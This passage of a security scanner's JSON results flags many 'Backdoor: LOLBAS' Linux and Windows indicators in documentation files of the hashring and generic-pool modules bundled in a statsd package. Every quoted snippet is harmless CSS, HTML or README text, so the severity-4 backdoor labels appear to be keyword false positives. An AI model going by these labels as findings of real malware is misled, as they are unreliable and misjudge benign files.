                "region": {
                  "startLine": 179,
                  "startColumn": 22,
                  "endLine": 179,
                  "endColumn": 28,
                  "snippet": {
                    "text": "</tr>\n<tr class=\"code\">\n<td class=\"docs\">\n<p>returns the correct node for the key based on the hashing, or false if it fails to get\nthe node</p>\n\n<h2></h2>\n",
                    "rendered": {
                      "text": "</tr>\n<tr class=\"code\">\n<td class=\"docs\">\n<p>returns the correct node for the key based on the hashing, or false if it fails to get\nthe node</p>\n\n<h2></h2>\n",
                      "markdown": "`</tr>\n<tr class=\"code\">\n<td class=\"docs\">\n<p>returns the correct node for the key based on the hashing, or false if it fails to get\nthe node</p>\n\n<h2></h2>\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 93,
                  "endLine": 126,
                  "endColumn": 99,
                  "snippet": {
                    "text": "<td class=\"docs\">\n<p>Creates a hashring for key =&gt; server lookups. It uses <code>crc32</code> as default algorithm\nas it creates nice dense key / server distribution. A other algorithm that could be used\nis <code>MD5</code> or <code>SHA1</code>. But take in account that the hashing can take allot time when choosing\nthe algorithm. The JavaScript based <code>crc32</code> algorithm beats <code>MD5</code> in performance.</p>\n\n<h2></h2>\n",
                    "rendered": {
                      "text": "<td class=\"docs\">\n<p>Creates a hashring for key =&gt; server lookups. It uses <code>crc32</code> as default algorithm\nas it creates nice dense key / server distribution. A other algorithm that could be used\nis <code>MD5</code> or <code>SHA1</code>. But take in account that the hashing can take allot time when choosing\nthe algorithm. The JavaScript based <code>crc32</code> algorithm beats <code>MD5</code> in performance.</p>\n\n<h2></h2>\n",
                      "markdown": "`<td class=\"docs\">\n<p>Creates a hashring for key =&gt; server lookups. It uses <code>crc32</code> as default algorithm\nas it creates nice dense key / server distribution. A other algorithm that could be used\nis <code>MD5</code> or <code>SHA1</code>. But take in account that the hashing can take allot time when choosing\nthe algorithm. The JavaScript based <code>crc32</code> algorithm beats <code>MD5</code> in performance.</p>\n\n<h2></h2>\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 13,
                  "endLine": 125,
                  "endColumn": 19,
                  "snippet": {
                    "text": "<tr class=\"code\">\n<td class=\"docs\">\n<p>Creates a hashring for key =&gt; server lookups. It uses <code>crc32</code> as default algorithm\nas it creates nice dense key / server distribution. A other algorithm that could be used\nis <code>MD5</code> or <code>SHA1</code>. But take in account that the hashing can take allot time when choosing\nthe algorithm. The JavaScript based <code>crc32</code> algorithm beats <code>MD5</code> in performance.</p>\n\n",
                    "rendered": {
                      "text": "<tr class=\"code\">\n<td class=\"docs\">\n<p>Creates a hashring for key =&gt; server lookups. It uses <code>crc32</code> as default algorithm\nas it creates nice dense key / server distribution. A other algorithm that could be used\nis <code>MD5</code> or <code>SHA1</code>. But take in account that the hashing can take allot time when choosing\nthe algorithm. The JavaScript based <code>crc32</code> algorithm beats <code>MD5</code> in performance.</p>\n\n",
                      "markdown": "`<tr class=\"code\">\n<td class=\"docs\">\n<p>Creates a hashring for key =&gt; server lookups. It uses <code>crc32</code> as default algorithm\nas it creates nice dense key / server distribution. A other algorithm that could be used\nis <code>MD5</code> or <code>SHA1</code>. But take in account that the hashing can take allot time when choosing\nthe algorithm. The JavaScript based <code>crc32</code> algorithm beats <code>MD5</code> in performance.</p>\n\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 20,
                  "endLine": 81,
                  "endColumn": 24,
                  "snippet": {
                    "text": "    margin: 0;\n    padding: 1px 0;\n}\ntable#source tr.code ul li p {\n    margin: 0;\n    padding: 0;\n}\n",
                    "rendered": {
                      "text": "    margin: 0;\n    padding: 1px 0;\n}\ntable#source tr.code ul li p {\n    margin: 0;\n    padding: 0;\n}\n",
                      "markdown": "`    margin: 0;\n    padding: 1px 0;\n}\ntable#source tr.code ul li p {\n    margin: 0;\n    padding: 0;\n}\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 20,
                  "endLine": 77,
                  "endColumn": 24,
                  "snippet": {
                    "text": "    margin: 15px 0 15px 35px;\n    padding: 0;\n}\ntable#source tr.code ul li {\n    margin: 0;\n    padding: 1px 0;\n}\n",
                    "rendered": {
                      "text": "    margin: 15px 0 15px 35px;\n    padding: 0;\n}\ntable#source tr.code ul li {\n    margin: 0;\n    padding: 1px 0;\n}\n",
                      "markdown": "`    margin: 15px 0 15px 35px;\n    padding: 0;\n}\ntable#source tr.code ul li {\n    margin: 0;\n    padding: 1px 0;\n}\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/doc/index.html"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 20,
                  "endLine": 73,
                  "endColumn": 24,
                  "snippet": {
                    "text": "table#source tr.code h3 {\n    font-size: 14px;\n}\ntable#source tr.code ul {\n    margin: 15px 0 15px 35px;\n    padding: 0;\n}\n",
                    "rendered": {
                      "text": "table#source tr.code h3 {\n    font-size: 14px;\n}\ntable#source tr.code ul {\n    margin: 15px 0 15px 35px;\n    padding: 0;\n}\n",
                      "markdown": "`table#source tr.code h3 {\n    font-size: 14px;\n}\ntable#source tr.code ul {\n    margin: 15px 0 15px 35px;\n    padding: 0;\n}\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/TODO.md"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 45,
                  "endLine": 44,
                  "endColumn": 51,
                  "snippet": {
                    "text": "      completes.\n - VALIDATION_RETURN_TO_HEAD :  Not in queue, currently being validated. An attempt to borrow the object\n      was made while previously being tested for eviction which removed it from\n      the queue. It should be returned to the head of the queue once validation\n      completes.\n - INVALID : Failed maintenance (e.g. eviction test or validation) and will be / has been destroyed\n - ABANDONED : Deemed abandoned, to be invalidated.\n",
                    "rendered": {
                      "text": "      completes.\n - VALIDATION_RETURN_TO_HEAD :  Not in queue, currently being validated. An attempt to borrow the object\n      was made while previously being tested for eviction which removed it from\n      the queue. It should be returned to the head of the queue once validation\n      completes.\n - INVALID : Failed maintenance (e.g. eviction test or validation) and will be / has been destroyed\n - ABANDONED : Deemed abandoned, to be invalidated.\n",
                      "markdown": "`      completes.\n - VALIDATION_RETURN_TO_HEAD :  Not in queue, currently being validated. An attempt to borrow the object\n      was made while previously being tested for eviction which removed it from\n      the queue. It should be returned to the head of the queue once validation\n      completes.\n - INVALID : Failed maintenance (e.g. eviction test or validation) and will be / has been destroyed\n - ABANDONED : Deemed abandoned, to be invalidated.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/TODO.md"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 49,
                  "endLine": 35,
                  "endColumn": 55,
                  "snippet": {
                    "text": " - EVICTION : In the queue, currently being tested for possible eviction.\n - EVICTION_RETURN_TO_HEAD : Not in the queue, currently being tested for possible eviction. An\n     attempt to borrow the object was made while being tested which removed it\n     from the queue. It should be returned to the head of the queue once\n     eviction testing completes.\n - VALIDATION : In the queue, currently being validated\n - VALIDATION_PREALLOCATED : Not in queue, currently being validated. The object was borrowed while\n",
                    "rendered": {
                      "text": " - EVICTION : In the queue, currently being tested for possible eviction.\n - EVICTION_RETURN_TO_HEAD : Not in the queue, currently being tested for possible eviction. An\n     attempt to borrow the object was made while being tested which removed it\n     from the queue. It should be returned to the head of the queue once\n     eviction testing completes.\n - VALIDATION : In the queue, currently being validated\n - VALIDATION_PREALLOCATED : Not in queue, currently being validated. The object was borrowed while\n",
                      "markdown": "` - EVICTION : In the queue, currently being tested for possible eviction.\n - EVICTION_RETURN_TO_HEAD : Not in the queue, currently being tested for possible eviction. An\n     attempt to borrow the object was made while being tested which removed it\n     from the queue. It should be returned to the head of the queue once\n     eviction testing completes.\n - VALIDATION : In the queue, currently being validated\n - VALIDATION_PREALLOCATED : Not in queue, currently being validated. The object was borrowed while\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 242,
                  "startColumn": 46,
                  "endLine": 242,
                  "endColumn": 50,
                  "snippet": {
                    "text": "     priorityRange : 3\n });\n\n // acquire connection - no priority - will go at front of line (same as high priority)\n pool.acquire(function(err, client) {\n     pool.release(client);\n });\n",
                    "rendered": {
                      "text": "     priorityRange : 3\n });\n\n // acquire connection - no priority - will go at front of line (same as high priority)\n pool.acquire(function(err, client) {\n     pool.release(client);\n });\n",
                      "markdown": "`     priorityRange : 3\n });\n\n // acquire connection - no priority - will go at front of line (same as high priority)\n pool.acquire(function(err, client) {\n     pool.release(client);\n });\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 70,
                  "endLine": 199,
                  "endColumn": 74,
                  "snippet": {
                    "text": "                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n           refreshIdle : boolean that specifies whether idle resources at or below the min threshold\n                         should be destroyed/re-created.  optional (default=true)\n     idleTimeoutMillis : max milliseconds a resource can go unused before it should be destroyed\n                         (default 30000)\n",
                    "rendered": {
                      "text": "                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n           refreshIdle : boolean that specifies whether idle resources at or below the min threshold\n                         should be destroyed/re-created.  optional (default=true)\n     idleTimeoutMillis : max milliseconds a resource can go unused before it should be destroyed\n                         (default 30000)\n",
                      "markdown": "`                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n           refreshIdle : boolean that specifies whether idle resources at or below the min threshold\n                         should be destroyed/re-created.  optional (default=true)\n     idleTimeoutMillis : max milliseconds a resource can go unused before it should be destroyed\n                         (default 30000)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 68,
                  "endLine": 195,
                  "endColumn": 72,
                  "snippet": {
                    "text": "               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n",
                    "rendered": {
                      "text": "               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n",
                      "markdown": "`               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 62,
                  "endLine": 193,
                  "endColumn": 66,
                  "snippet": {
                    "text": "                create : function that returns a new resource\n                           should call callback() with the created resource\n               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n",
                    "rendered": {
                      "text": "                create : function that returns a new resource\n                           should call callback() with the created resource\n               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n",
                      "markdown": "`                create : function that returns a new resource\n                           should call callback() with the created resource\n               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 175,
                  "startColumn": 45,
                  "endLine": 175,
                  "endColumn": 49,
                  "snippet": {
                    "text": "idle resources have timed out.  For example, you can call:\n\n```js\n// Only call this once in your application -- at the point you want\n// to shutdown and stop using this pool.\npool.drain(function() {\n    pool.destroyAllNow();\n",
                    "rendered": {
                      "text": "idle resources have timed out.  For example, you can call:\n\n```js\n// Only call this once in your application -- at the point you want\n// to shutdown and stop using this pool.\npool.drain(function() {\n    pool.destroyAllNow();\n",
                      "markdown": "`idle resources have timed out.  For example, you can call:\n\n```js\n// Only call this once in your application -- at the point you want\n// to shutdown and stop using this pool.\npool.drain(function() {\n    pool.destroyAllNow();\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 81,
                  "endLine": 37,
                  "endColumn": 85,
                  "snippet": {
                    "text": "       - Merged #64 - Fix for not removing idle objects (contributed by PiotrWpl)\n\n    2.0.3 - January 16 2013\n       - Merged #56/#57 - Add optional refreshIdle flag. If false, idle resources at the pool minimum will not be\n         destroyed/re-created. (contributed by wshaver)\n       - Merged #54 - Factory can be asked to validate pooled objects (contributed by tikonen)\n\n",
                    "rendered": {
                      "text": "       - Merged #64 - Fix for not removing idle objects (contributed by PiotrWpl)\n\n    2.0.3 - January 16 2013\n       - Merged #56/#57 - Add optional refreshIdle flag. If false, idle resources at the pool minimum will not be\n         destroyed/re-created. (contributed by wshaver)\n       - Merged #54 - Factory can be asked to validate pooled objects (contributed by tikonen)\n\n",
                      "markdown": "`       - Merged #64 - Fix for not removing idle objects (contributed by PiotrWpl)\n\n    2.0.3 - January 16 2013\n       - Merged #56/#57 - Add optional refreshIdle flag. If false, idle resources at the pool minimum will not be\n         destroyed/re-created. (contributed by wshaver)\n       - Merged #54 - Factory can be asked to validate pooled objects (contributed by tikonen)\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 81,
                  "endLine": 196,
                  "snippet": {
                    "text": "               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n           refreshIdle : boolean that specifies whether idle resources at or below the min threshold\n",
                    "rendered": {
                      "text": "               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n           refreshIdle : boolean that specifies whether idle resources at or below the min threshold\n",
                      "markdown": "`               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n                         optional (default=0)\n           refreshIdle : boolean that specifies whether idle resources at or below the min threshold\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 75,
                  "endLine": 194,
                  "snippet": {
                    "text": "                create : function that returns a new resource\n                           should call callback() with the created resource\n               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n",
                    "rendered": {
                      "text": "                create : function that returns a new resource\n                           should call callback() with the created resource\n               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n",
                      "markdown": "`                create : function that returns a new resource\n                           should call callback() with the created resource\n               destroy : function that accepts a resource and destroys it\n                   max : maximum number of resources to create at any given time\n                         optional (default=1)\n                   min : minimum number of resources to keep in pool at any given time\n                         if this is set > max, the pool will silently set the min\n                         to factory.max - 1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 20,
                  "endLine": 182,
                  "endColumn": 26,
                  "snippet": {
                    "text": "});\n```\n    \nIf you do this, your node process will exit gracefully.\n    \n    \n## Documentation\n",
                    "rendered": {
                      "text": "});\n```\n    \nIf you do this, your node process will exit gracefully.\n    \n    \n## Documentation\n",
                      "markdown": "`});\n```\n    \nIf you do this, your node process will exit gracefully.\n    \n    \n## Documentation\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 64,
                  "endLine": 163,
                  "endColumn": 5,
                  "snippet": {
                    "text": "If you are shutting down a long-lived process, you may notice\nthat node fails to exit for 30 seconds or so.  This is a side\neffect of the idleTimeoutMillis behavior -- the pool has a \nsetTimeout() call registered that is in the event loop queue, so\nnode won't terminate until all resources have timed out, and the pool\nstops trying to manage them.  \n\nThis behavior will be more problematic when you set factory.min > 0,\n",
                    "rendered": {
                      "text": "If you are shutting down a long-lived process, you may notice\nthat node fails to exit for 30 seconds or so.  This is a side\neffect of the idleTimeoutMillis behavior -- the pool has a \nsetTimeout() call registered that is in the event loop queue, so\nnode won't terminate until all resources have timed out, and the pool\nstops trying to manage them.  \n\nThis behavior will be more problematic when you set factory.min > 0,\n",
                      "markdown": "`If you are shutting down a long-lived process, you may notice\nthat node fails to exit for 30 seconds or so.  This is a side\neffect of the idleTimeoutMillis behavior -- the pool has a \nsetTimeout() call registered that is in the event loop queue, so\nnode won't terminate until all resources have timed out, and the pool\nstops trying to manage them.  \n\nThis behavior will be more problematic when you set factory.min > 0,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 160,
                  "startColumn": 4,
                  "endLine": 160,
                  "endColumn": 10,
                  "snippet": {
                    "text": "### Step 3 - Drain pool during shutdown (optional)\n    \nIf you are shutting down a long-lived process, you may notice\nthat node fails to exit for 30 seconds or so.  This is a side\neffect of the idleTimeoutMillis behavior -- the pool has a \nsetTimeout() call registered that is in the event loop queue, so\nnode won't terminate until all resources have timed out, and the pool\n",
                    "rendered": {
                      "text": "### Step 3 - Drain pool during shutdown (optional)\n    \nIf you are shutting down a long-lived process, you may notice\nthat node fails to exit for 30 seconds or so.  This is a side\neffect of the idleTimeoutMillis behavior -- the pool has a \nsetTimeout() call registered that is in the event loop queue, so\nnode won't terminate until all resources have timed out, and the pool\n",
                      "markdown": "`### Step 3 - Drain pool during shutdown (optional)\n    \nIf you are shutting down a long-lived process, you may notice\nthat node fails to exit for 30 seconds or so.  This is a side\neffect of the idleTimeoutMillis behavior -- the pool has a \nsetTimeout() call registered that is in the event loop queue, so\nnode won't terminate until all resources have timed out, and the pool\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 64,
                  "endLine": 112,
                  "snippet": {
                    "text": "\n```js\n// Create a MySQL connection pool with\n// a max of 10 connections, a min of 2, and a 30 second max idle time\nvar poolModule = require('generic-pool');\nvar pool = poolModule.Pool({\n    name     : 'mysql',\n    create   : function(callback) {\n",
                    "rendered": {
                      "text": "\n```js\n// Create a MySQL connection pool with\n// a max of 10 connections, a min of 2, and a 30 second max idle time\nvar poolModule = require('generic-pool');\nvar pool = poolModule.Pool({\n    name     : 'mysql',\n    create   : function(callback) {\n",
                      "markdown": "`\n```js\n// Create a MySQL connection pool with\n// a max of 10 connections, a min of 2, and a 30 second max idle time\nvar poolModule = require('generic-pool');\nvar pool = poolModule.Pool({\n    name     : 'mysql',\n    create   : function(callback) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/generic-pool/README.md"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 11,
                  "endLine": 110,
                  "endColumn": 18,
                  "snippet": {
                    "text": "### Step 1 - Create pool using a factory object\n\n```js\n// Create a MySQL connection pool with\n// a max of 10 connections, a min of 2, and a 30 second max idle time\nvar poolModule = require('generic-pool');\nvar pool = poolModule.Pool({\n",
                    "rendered": {
                      "text": "### Step 1 - Create pool using a factory object\n\n```js\n// Create a MySQL connection pool with\n// a max of 10 connections, a min of 2, and a 30 second max idle time\nvar poolModule = require('generic-pool');\nvar pool = poolModule.Pool({\n",
                      "markdown": "`### Step 1 - Create pool using a factory object\n\n```js\n// Create a MySQL connection pool with\n// a max of 10 connections, a min of 2, and a 30 second max idle time\nvar poolModule = require('generic-pool');\nvar pool = poolModule.Pool({\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
